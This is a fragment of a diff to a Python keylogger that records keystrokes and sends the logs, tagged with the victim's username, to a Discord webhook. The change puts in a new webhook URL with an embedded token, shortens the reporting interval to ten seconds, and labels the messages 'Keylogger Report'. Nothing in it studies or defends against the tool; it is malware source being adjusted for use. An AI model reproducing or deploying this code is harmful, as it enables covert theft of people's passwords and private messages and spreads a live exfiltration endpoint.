@@ -3,8 +3,8 @@ from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-SEND_REPORT_EVERY = 60
-WEBHOOK = "https://discord.com/api/webhooks/971587489515065354/BIW03h4Zbj_8ByraR3Z4JrJEV2Y1UA9kJFxJt6sc8JzREXGesJD4abX5Xd8FBPi6MEAh"
+SEND_REPORT_EVERY = 10
+WEBHOOK = "https://discordapp.com/api/webhooks/1298512687411630101/OYSkLB04ez5smfgBO8AmZdf9IiBgdJsIlH-IicRQLLK3sT8p8r8zG0xZK_HjR5oL3Bsi"
 
 class Keylogger: 
     def __init__(self, interval, report_method="webhook"):
@@ -42,7 +42,7 @@ class Keylogger:
             with open(path, 'rb') as f:
                 webhook.add_file(file=f.read(), filename='report.txt')
         else:
-            embed = DiscordEmbed(title=f" Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
             webhook.add_embed(embed)    
         webhook.execute()
         if flag:
